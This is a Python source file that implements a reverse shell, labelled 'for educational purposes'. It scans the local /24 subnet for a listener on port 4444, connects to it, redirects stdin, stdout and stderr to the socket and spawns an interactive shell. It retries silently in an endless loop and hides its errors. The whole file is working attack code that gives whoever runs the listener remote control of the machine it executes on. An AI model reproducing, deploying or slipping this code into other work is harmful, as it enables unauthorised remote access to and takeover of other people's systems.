"""Reverse shell implementation with automatic listener discovery for educational purposes."""

import os
import socket
import subprocess
import time


def discover_listener_ip(port: int) -> str | None:
    """Detects the local IPv4 address and scans the /24 subnet for a listener."""
    try:
        # Get local IP by 'connecting' to a public DNS (no actual packet sent for UDP)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        return None

    prefix = ".".join(local_ip.split(".")[:-1]) + "."
    
    # Scan the /24 subnet for an open port
    for i in range(1, 255):
        target_ip = f"{prefix}{i}"
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as scan_socket:
                scan_socket.settimeout(0.01)  # Fast timeout for local network scanning
                if scan_socket.connect_ex((target_ip, port)) == 0:
                    return target_ip
        except (socket.error, socket.timeout):
            continue
    return None


def run_reverse_shell(port: int = 4444) -> None:
    """Continuously attempts to discover a listener and establish a reverse shell."""
    while True:
        target_host = discover_listener_ip(port)
        if not target_host:
            time.sleep(10)  # Wait before retrying discovery
            continue

        try:
            # Establish the socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_host, port))

            # Duplicate file descriptors for stdin, stdout, and stderr to the socket
            # This allows the shell to use the socket for interaction
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            # Spawn the shell
            # Using /bin/sh -i as it is universal on macOS and Linux
            shell = "/bin/sh"
            if os.path.exists("/bin/zsh"):
                shell = "/bin/zsh"
            elif os.path.exists("/bin/bash"):
                shell = "/bin/bash"

            subprocess.call([shell, "-i"])
        except Exception:
            # Silently fail and retry after a delay
            pass
        finally:
            try:
                s.close()
            except NameError:
                pass
            time.sleep(15)  # Reconnection delay
